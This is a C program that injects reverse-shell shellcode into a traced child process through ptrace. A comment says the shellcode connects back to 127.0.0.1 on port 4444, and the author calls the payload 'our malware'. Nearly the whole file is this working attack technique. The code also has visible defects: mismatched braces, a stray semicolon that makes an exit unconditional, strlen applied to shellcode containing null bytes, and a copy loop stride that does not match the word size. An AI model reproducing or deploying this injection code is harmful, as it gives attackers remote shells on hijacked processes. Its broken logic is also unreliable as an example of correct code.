#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>


int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len);


int main(int argc, char **argv){
    
    unsigned char *payload = (unsigned char*) // reverse shell 127.0.0.1, 4444

        "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
        "\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
        "\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
        "\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
        "\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
        "\x89\xe6\x0f\x05";

    size_t payload_size = strlen((char*)payload);
    pid_t pid; 
    int status;
    
// spawn a child process
    pid = fork();

    if (pid == -1){
        perror("fork");
        exit(-1);
    }else if (pid == 0) {
        // child process
        if(ptrace(PTRACE_TRACEME, 0, NULL, NULL)==-1){
            perror("ptrace");
            exit(-1);
        }
        
        execl("/bin/ls", "ls", NULL);
        exit(0);
    }else{

        if(waitpid(pid, &status, 0) == -1){
            perror("waitpid");
            exit(-1);
        }

        if (!WIFSTOPPED(status)){
            perror("Child has not stopped");
            exit(-1);
        }
        // get the registers, we need to get the RIP(instruction pointer) so our malware can run there
        struct user_regs_struct regs;

        printf("Got registers\n");

        ptrace(PTRACE_GETREGS,pid, NULL, &regs);
        printf("RAX: %llx\n", (unsigned long long) regs.rax);
        printf("RBX: %llx\n", (unsigned long long) regs.rbx);
        printf("RCX: %llx\n", (unsigned long long) regs.rcx);
        printf("RDX: %llx\n", (unsigned long long) regs.rdx);
        printf("RDI: %llx\n", (unsigned long long) regs.rdi);
        printf("RSI: %llx\n", (unsigned long long) regs.rsi);
        printf("RIP: %llx\n", (unsigned long long) regs.rip);

        //injecting shell code at the RIP
        printf("[+] Injecting shell code at:%p[+]\n",(void*)regs.rip);
        injecting_shell(pid, payload,(void*)regs.rip, payload_size);
        
        regs.rip += payload_size;
        printf("[+] Setting instruciton pointer %p[+]\n",(void*)regs.rip);

        if(ptrace(PTRACE_SETREGS, pid, NULL, &regs) ==-1){
        perror("ptrace(GETREGS):");
        exit(-1);
        }

        if((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1);
            perror("ptrace(CONT)");
            exit(-1);
        }

        printf("[+]Running![+]\n");

        if ((ptrace(PTRACE_CONT,pid, NULL, NULL)) == -1){
            perror("ptrace(CONT):");
            exit(-1);
        }

        if(waitpid(pid, &status, 0) ==-1){
            perror("waitpid");
            exit(-1);
        }

        printf("[+] Done![+]\n");

    return 0;
}
//function to define the malware
int injecting_shell(pid_t pid, unsigned char *src, void *dst, int len){
    unsigned long long *s = (unsigned long long *) src;
    unsigned long long *d = (unsigned long long *) dst;
    for(int i = 0; i < len; i+=4, s++, d++)
    {
        if ((ptrace(PTRACE_POKETEXT, pid, d, *s))<0)
        {
            perror("ptrace(PTRACE_POKETEXT):");
            exit(-1);
        }
    }

    if((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1){
        perror("ptrace(CONT):");
        exit(-1);
}

    waitpid(pid, NULL, 0);

    return 0;
}
